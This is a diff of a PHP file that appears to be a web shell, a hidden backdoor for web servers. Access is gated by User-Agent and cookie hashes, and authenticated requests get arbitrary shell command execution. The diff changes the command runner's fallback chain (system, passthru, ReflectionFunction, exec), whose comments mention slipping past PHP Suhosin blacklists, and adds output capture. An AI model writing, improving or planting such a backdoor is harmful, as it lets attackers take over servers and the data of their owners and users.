@@ -1,11 +1,11 @@
 <?php
-//d16d24366c1074f0607ae6c5bdb3ab9e21813ccc0b91edb4a15a680a1ee5ee08fed6fce744e13f3209a70c8dbe6e285b035de9cb7d7277e08765043cf63c7b28ff0d17e73bad5fa53aa6d2
+//LEAVE ME IN
 
 error_reporting(E_WARNING | E_PARSE);
-define("allow_agent", sha1("sp/1.1"));
-define("uuid", sha1("123-123-123-123-123"));
-define("cname", "test");
-define("cval", sha1("test"));
+define("allow_agent", sha1(""));
+define("uuid", sha1(""));
+define("cname", "");
+define("cval", sha1(""));
 if (!defined('allowed_chars')) {
     define("allowed_chars", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKMNOPQRSTUVWXYZ");
 }
@@ -309,43 +309,58 @@ function normalize_for_windows($com): string
 
 function executeCommands($command)
 {
+    $output = "";
     if (defined("slopWindows")) {
         $command = normalize_for_windows($command);
     }
     # Try to find a way to run our command using various PHP internals
     if (function_exists('call_user_func_array')) {
         # http://php.net/manual/en/function.call-user-func-array.php
-        return call_user_func_array('system', array($command));
+        ob_start();
+        call_user_func_array('system', array($command));
+        $output = ob_get_contents();
+        ob_end_clean();
     } elseif (function_exists('call_user_func')) {
         # http://php.net/manual/en/function.call-user-func.php
-        return call_user_func('system', $command);
+        ob_start();
+        call_user_func('system', $command);
+        $output = ob_get_contents();
+        ob_end_clean();
     } else if (function_exists('passthru')) {
         # https://www.php.net/manual/en/function.passthru.php
         ob_start();
-        passthru($command, $return_var);
+        passthru($command);
+        $output = ob_get_contents();
         ob_end_clean();
-        return $return_var;
     } else if (function_exists('system')) {
         # this is the last resort. chances are PHP Suhosin
         # has system() on a blacklist anyways :>
         # http://php.net/manual/en/function.system.php
-        return system($command);
+        ob_start();
+        system($command);
+        $output = ob_get_contents();
+        ob_end_clean();
     } else if (class_exists('ReflectionFunction')) {
         # http://php.net/manual/en/class.reflectionfunction.php
         $function = new ReflectionFunction('system');
-        return $function->invoke($command);
+        ob_start();
+        $function->invoke($command);
+        $output = ob_get_contents();
+        ob_end_clean();
+
+    }elseif(function_exists("exec")){
+        $output = [];
+        exec($command, $output);
+    }else {
+        return "No functions for code execution can be used.";
     }
-    return "No functions for code execution can be used.";
+    return match (true) {
+        is_array($output) => implode(":", $output),
+        default => implode(":", explode("\n", preg_replace("/\n(?=[^-|\h])/m", ";", $output))),   };
 }
 
 function slopp()
 {
-    $headers = [];
-    foreach ($_SERVER as $key => $value) {
-        if (strpos($key, 'HTTP_') === 0) {
-            $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($key, 5)))))] = $value;
-        }
-    }
     if (validate_auth($_SERVER['HTTP_USER_AGENT'], $_COOKIE[cname], $_COOKIE['uuid'])) {
         header("I-Am-Alive: Yes");
         banner();
